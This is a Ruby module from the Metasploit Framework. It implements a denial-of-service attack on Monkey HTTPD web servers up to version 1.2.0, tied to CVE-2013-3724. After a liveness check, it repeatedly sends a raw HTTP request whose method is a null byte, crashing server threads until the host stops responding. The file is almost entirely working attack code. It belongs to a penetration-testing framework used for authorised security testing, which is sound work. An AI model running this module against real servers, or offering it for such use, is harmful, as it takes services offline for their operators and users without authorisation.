##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Monkey HTTPD Null Byte Request',
			'Description'    => %q{
				Sending a request containing null bytes causes a
			thread to crash.  If you crash all of the threads,
			the server becomes useless.  Affects versions <= 1.2.0.
			},
			'Author'         =>
				[
					'Doug Prostko <dougtko[at]gmail[dot]com>'
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['CVE', '2013-3724'],
				],
			'DisclosureDate' => 'May 25 2013'))

		register_options(
			[
				Opt::RPORT(2001),
				OptInt.new("TIMEOUT", [ false, "Set timeout for connectivity check", 30 ]),
			], self.class)
	end

	def is_alive
		connect
		res = send_request_raw({
			'method' => "GET",
			'uri' => "/"
		}, timeout = datastore['TIMEOUT'])
		if ! res
			raise ::Rex::ConnectionTimeout
		end
		disconnect
	end

	def run
		loop do
			begin
				is_alive
				connect
				print_status("Sending DoS packet to #{rhost}:#{rport}")
				send_request_raw({'method' => "\x00"})
				disconnect
			rescue ::Rex::ConnectionRefused
				print_status("Unable to connect to #{rhost}:#{rport}.")
				break
			rescue ::Errno::ECONNRESET
				print_status("DoS packet successful. #{rhost} not responding.")
				break
			rescue ::Rex::HostUnreachable
				print_status("Couldn't connect to #{rhost}:#{rport}.")
				break
			rescue ::Timeout::Error, ::Errno::EPIPE
				print_status("Timeout error connecting to #{rhost}:#{rport}.")
				break
			rescue ::Rex::ConnectionTimeout
				print_good("Monkey server is down!")
				break
			ensure
				disconnect
			end
		end
	end
end
